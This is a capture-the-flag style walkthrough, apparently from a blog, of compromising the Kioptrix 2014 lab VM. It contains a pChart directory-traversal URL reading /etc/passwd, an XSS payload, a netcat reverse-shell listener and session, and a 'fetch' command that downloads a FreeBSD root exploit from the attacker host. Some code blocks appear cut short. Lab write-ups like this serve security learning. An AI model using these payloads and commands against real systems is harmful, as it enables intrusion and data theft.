I started out by finding the IP address of the target's machine. This can be done with `netdiscover`, which shows the IP address along with a MAC address. Since I already knew the MAC address (shown in VirtualBox), this could be easily matched with the right IP address. I used the `-r` option to scan for a limited range in which I know the IP address will be, which saves time.

```bash
kali@kali:~$ sudo netdiscover -r 192.168.56.0/16

Currently scanning: 192.168.70.0/16   |   Screen View: Unique Hosts

```

I then ran an nmap scan against the target's IP address `192.168.56.116` to find out more about the target. I used the `-sS`, `-A`, `-n` and `-oA` options because in my opinion these serve a good general purpose with relatively quick but useful results. I also recently started adding the `-p-` option to make sure I don't miss any crucial ports. This checks all possible ports, not just the most common ones. I saved the output in a file because I donâ€™t like to do multiple scans unless I absolutely have to (such as when I need different `nmap` options to fit a very specific purpose).

```bash
kali@kali:~$ sudo nmap -sS -A -n -p- -oA kioptrix2014 192.168.56.116

I looked around for exploits on the versions running on the target machine, but didn't find anything particularly interesting. I decided to visit the website the target was hosting on port 80. I found the following:

![alt]({{ site.url }}{{ site.baseurl }}/images/kioptrix2014_source.png)

Visiting the URL referred to in the page source, I found the following:

![alt]({{ site.url }}{{ site.baseurl }}/images/kioptrix2014_pchart.png)

I looked around for exploits based on this particular version of `pChart` (2.1.3) and found a directory traversal vulnerability:

```bash
kali@kali:~$ searchsploit pchart 2.1.3

# Exploit Title: pChart 2.1.3 Directory Traversal and Reflected XSS
# Date: 2014-01-24
# Exploit Author: Balazs Makany
# Vendor Homepage: www.pchart.net
# Software Link: www.pchart.net/download
# Google Dork: intitle:"pChart 2.x - examples" intext:"2.1.3"
# Version: 2.1.3

# CVE : N/A

[0] Summary:
PHP library pChart 2.1.3 (and possibly previous versions) by default
contains an examples folder, where the application is vulnerable to
Directory Traversal and Cross-Site Scripting (XSS).
It is plausible that custom built production code contains similar
problems if the usage of the library was copied from the examples.
The exploit author engaged the vendor before publicly disclosing the
vulnerability and consequently the vendor released an official fix
before the vulnerability was published.


[1] Directory Traversal:                                                                                                                                                       
hxxp://localhost/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd                                                                                             
The traversal is executed with the web servers privilege and leads to                                                                                                         
sensitive file disclosure (passwd, siteconf.inc.php or similar),                                                                                                               
access to source codes, hardcoded passwords or other high impact                                                                                                               
consequences, depending on the web servers configuration.                                                                                                                     
This problem may exists in the production code if the example code was                                                                                                         
copied into the production environment.

Directory Traversal remediation:
1) Update to the latest version of the software.
2) Remove public access to the examples folder where applicable.
3) Use a Web Application Firewall or similar technology to filter
malicious input attempts.


[2] Cross-Site Scripting (XSS):
hxxp://localhost/examples/sandbox/script/session.php?<script>alert('XSS')</script>
This file uses multiple variables throughout the session, and most of
them are vulnerable to XSS attacks. Certain parameters are persistent
throughout the session and therefore persists until the user session
is active. The parameters are unfiltered.

Cross-Site Scripting remediation:
1) Update to the latest version of the software.
2) Remove public access to the examples folder where applicable.
3) Use a Web Application Firewall or similar technology to filter
malicious input attempts.


[3] Disclosure timeline:
2014 January 16 - Vulnerability confirmed, vendor contacted
2014 January 17 - Vendor replied, responsible disclosure was orchestrated
2014 January 24 - Vendor was inquired about progress, vendor replied
and noted that the official patch is released.
```

Using this vulnerability, I was indeed able to view the `/etc/passwd` file. However, since there weren't any login prompts I could use these usernames on in a potential bruteforce attempt (not even SSH), this wasn't of much help. I looked around to see what other files I could find and ended up finding something interesting in the `httpd.conf` file. Note that this file has a different location on FreeBSD than you might expect.

At the very end, it mentioned a UserAgent setting requirement which did not match my current browser version. I used `BurpSuite` to edit my User Agent settings and revisited the website. I couldn't notice any differences, so I moved on to the website hosted on port 8080.

That particular website restricted pretty much all access. I even checked for hidden directories with `dirb`, but all of them were restricted. Then I realized that the User Agent requirement could be related to this, so I edited my User Agent settings once again and was granted access to the website on port 8080. It seemed to be using something called `phptax` and since it looked so old, I immediately looked for exploits. Since I try to stay away from using Metasploit exploits as much as I can, I went with the following:

```bash
kali@kali:~$ searchsploit phptax

Running the exploit, I ran into an error related to `curl`. I found out I needed `php-curl`, so I installed that and tried again. Unfortunately, the exploit still failed. I took a closer look at the code to find out if/how I could exploit this vulnerability manually. I was able to create a `.php` file, fill it with content and then inject arbitrary commands using the `GET` function:

![alt]({{ site.url }}{{ site.baseurl }}/images/kioptrix2014_createphpfile.png)

![alt]({{ site.url }}{{ site.baseurl }}/images/kioptrix2014_executephpfile.png)

![alt]({{ site.url }}{{ site.baseurl }}/images/kioptrix2014_commandinjection.png)

So I was able to execute commands on the target's machine hosting the website. The next step was using this to give myself a shell:

![alt]({{ site.url }}{{ site.baseurl }}/images/kioptrix2014_shell.png)

```bash
kali@kali:~$ nc -nlvp 1234
listening on [any] 1234 ...
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.116] 51938
sh: cant access tty; job control turned off
$ whoami
www
```

Note that the URL contains a reverse shell "oneliner" written in Perl (Bash failed me), but is "percent encoded" in order to let the browser understand all of the characters in the URL. A number of characters aren't allowed in URLs, which is why they're often encoded this way.

I spent some time looking around on the target's machine, hopefully finding a vulnerable configuration or something similar to escalate my privileges. I didn't find anything worthwhile, so I checked the version of FreeBSD that was currently running. This turned out to be 9.0, which I was able to exploit giving me full access of the machine:

```bash
$ cd /tmp
$ fetch http://192.168.56.102:7777/28718.c
28718.c                                               5563  B   50 MBps

Note: since `wget` wasn't available on this particular machine I used `fetch` as an alternative to `wget` to download the exploit on the target's machine, but I could've also used something like `nc`.

## Lessons learned

My initial access to the target's machine relied on old, insecure versions of `pChart` and `phptax`. This could've been prevented by regularly patching or switching to different software altogether if no security patch is out yet. The User Agent requirement was a nice touch, but nothing that can't be evaded by changing your browser settings or using `BurpSuite`.

After gaining limited shell access to the target's machine, I thoroughly looked for configuration issues but I couldn't find any, so in that regard the target was secured nicely. However, I was able to use the vulnerable FreeBSD version running on the machine to my advantage to gain root access. This could've also been prevented by regularly updating.
